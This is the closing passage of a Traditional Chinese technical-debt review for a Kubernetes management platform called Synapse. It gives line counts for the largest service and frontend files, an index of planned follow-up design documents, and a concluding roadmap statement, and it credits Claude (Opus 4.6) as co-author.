| cost_service.go | 846 |
| alertmanager_service.go | 762 |
| grafana_service.go | 687 |
| rbac_service.go | 685 |
| permission_service.go | 607 |
| operation_log_service.go | 586 |
| helm_service.go | 540 |

### A.3 前端頁面（前 15 大）

| 檔名 | 行數 |
| --- | ---: |
| cost/CostDashboard.tsx | 1,398 |
| logs/LogCenter.tsx | 1,325 |
| node/NodeList.tsx | 1,148 |
| workload/DeploymentTab.tsx | 1,071 |
| workload/tabs/ContainerTab.tsx | 979 |
| node/NodeDetail.tsx | 978 |
| node/NodeOperations.tsx | 957 |
| pod/PodList.tsx | 928 |
| workload/DaemonSetTab.tsx | 857 |
| workload/CronJobTab.tsx | 857 |
| workload/JobTab.tsx | 856 |
| workload/ArgoRolloutTab.tsx | 856 |
| permission/PermissionManagement.tsx | 856 |
| workload/StatefulSetTab.tsx | 855 |

---

## 附錄 B：執行手冊索引

本文件目前是全貌 — 後續拆解的執行細節應建立下列子文件（尚未撰寫）：

- `docs/REFACTOR_HANDLER_GUIDE.md` — P0-4 handler 改造模板與逐檔清單
- `docs/ROLE_MIGRATION_PLAN.md` — P0-2 SystemRole 導入詳細步驟與 rollback 方案
- `docs/JWT_REVOCATION_DESIGN.md` — P0-5 JWT 黑名單設計 RFC
- `docs/REPOSITORY_LAYER_ADR.md` — Repository layer ADR
- `docs/OBSERVABILITY_PLAN.md` — OpenTelemetry 導入計畫
- `docs/TEST_STRATEGY.md` — 測試金字塔與 coverage 目標
- `docs/SECURITY_HEADERS.md` — CSP / HSTS / frame-ancestors 設定

---

## 結語

Synapse 是一個功能驚人、範圍極廣的平台：69 個 handler、50 個 service、137 個前端頁面、超過 16 萬行程式碼，涵蓋工作負載、網路、儲存、安全、監控、成本、AI、多叢集、GitOps、審計等領域。

**它已經是一個「能用的」系統，但還不是一個「好維護的」系統。**

本文件列出的技術債不代表失敗，而是快速開發帶來的正常副產物。真正危險的是視而不見，讓債務利息超過開發速度。

接下來的工作，按本文件的四個 Phase 推進，目標在 **一年內** 把 Synapse 從「功能驚人但脆弱」提升到「功能驚人且穩健」，讓它真正配得上 "synapse" 這個名字 —— 成為叢集之間流暢可靠的神經網路。

---

**文件維護**

- 作者：Claude (Opus 4.6) 協同撰寫
- 最後更新：2026-04-09
- 審視週期：每季度一次
- 變更紀錄：見 git log
